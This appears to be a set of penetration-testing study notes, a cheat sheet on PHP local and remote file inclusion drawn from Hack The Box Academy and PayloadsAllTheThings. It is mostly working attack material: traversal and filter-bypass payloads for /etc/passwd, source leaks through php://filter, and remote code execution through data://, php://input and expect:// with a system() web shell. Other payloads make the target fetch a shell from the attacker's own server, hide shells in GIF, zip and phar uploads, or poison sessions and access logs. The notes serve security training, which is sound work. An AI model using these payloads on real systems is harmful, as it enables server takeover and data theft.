## File Inclusion / Local File Inclusion
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
https://academy.hackthebox.com/module/23/section/252

> Différence entre Local File Inclusion & Path Traversal : https://www.perplexity.ai/search/c-est-quoi-la-difference-entre-IcqEhcTNSQG4xydII.zABA

## Basic LFI / Paf Traversal

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=../../../../../../../../../../../../etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=..\..\..\C:\Windows\boot.ini
```

### Non-Recursive Path Traversal Filters case
When the application use this kind of function to detect & delete '../'

```php
$language = str_replace('../', '', $_GET['language']);
```
We can bypass it using :
```bash
....//....//....//....//etc/passwd
# URL encode from burp
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

### Approved Paths case
This time, if the application match a string in the URL : 

```bash
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

We can bypass it using : 
```bash
?language=./languages/../../../../etc/passwd
```

### Path Truncation
In earlier versions of PHP, defined strings have a maximum **length of 4096 characters**, likely due to the **limitation of 32-bit systems**. 
If a longer string is passed, it will simply be **truncated**, and **any characters after the maximum length will be ignored**.

```bash
$  echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

### Null Bytes
**PHP versions before 5.5** were vulnerable to **null byte injection**, which means that adding a null byte (**%00**) at the end of the string would terminate the string and not consider anything after it.

```bash
/etc/passwd%00
```

### PHP Filter to leak source code 
https://www.php.net/manual/en/filters.convert.php

```bash
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

### LFI to RCE
Check the current configuration of web serveur : (here apache)
```bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

``allow_url_include`` -> Not enabled by default

Crafting payload

```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid


-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Using Input wrapper

```bash
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Using Expect wrapper

```bash
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect

$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Remote File Inclusion (RFI)

| Language | Function/Instruction          | Read Content | Execute | Remote URL |
|----------|------------------------------|:------------:|:-------:|:----------:|
| PHP      | include()/include_once()     |      ✅      |   ✅    |     ✅     |
| PHP      | file_get_contents()          |      ✅      |   ❌    |     ✅     |
| Java     | import                       |      ✅      |   ✅    |     ✅     |
| .NET     | @Html.RemotePartial()        |      ✅      |   ❌    |     ✅     |
| .NET     | include                      |      ✅      |   ✅    |     ✅     |

To exploit RFI, we need to check if allow_url_include is equal to "On"

```html
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Using web server
$ python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) .
# Using FTP server
$ python -m pyftpdlib -p 21
# Using SMB server
$ impacket-smbserver -smb2support share $(pwd)
```

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id'
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id'
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
curl 'http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami'
```

### LFI to File Uploads

| Language | Function/Instruction       | Read Content | Execute | Remote URL |
|----------|----------------------------|:------------:|:-------:|:----------:|
| PHP      | include()/include_once()   |      ✅      |   ✅    |     ✅     |
| PHP      | require()/require_once()   |      ✅      |   ✅    |     ❌     |
| NodeJS   | res.render()               |      ✅      |   ✅    |     ❌     |
| Java     | import                     |      ✅      |   ✅    |     ✅     |
| .NET     | include                    |      ✅      |   ✅    |     ✅     |

Gif Payload

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
curl 'http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id'
```

Zip Payload

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
curl 'http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id'
```

Phar Payload

Phar content : 
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```bash
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id'
```

### PHP Session Poisoning

| Language | Function/Instruction        | Read Content | Execute | Remote URL |
|----------|----------------------------|:------------:|:-------:|:----------:|
| PHP      | include()/include_once()   |      ✅      |   ✅    |     ✅     |
| PHP      | require()/require_once()   |      ✅      |   ✅    |     ❌     |
| NodeJS   | res.render()               |      ✅      |   ✅    |     ❌     |
| Java     | import                     |      ✅      |   ✅    |     ✅     |
| .NET     | include                    |      ✅      |   ✅    |     ✅     |


When users have a PHPSESSID defined and the application is vulnerable to file inclusion, we can abuse it:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E (<?php system($_GET["cmd"]);?> in URL encode)
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
(Repeat the processus for every command)

### Server Log Poisoning
When the application is vulnerable to LFI and we can display logs inside the web application.

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

```bash
$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
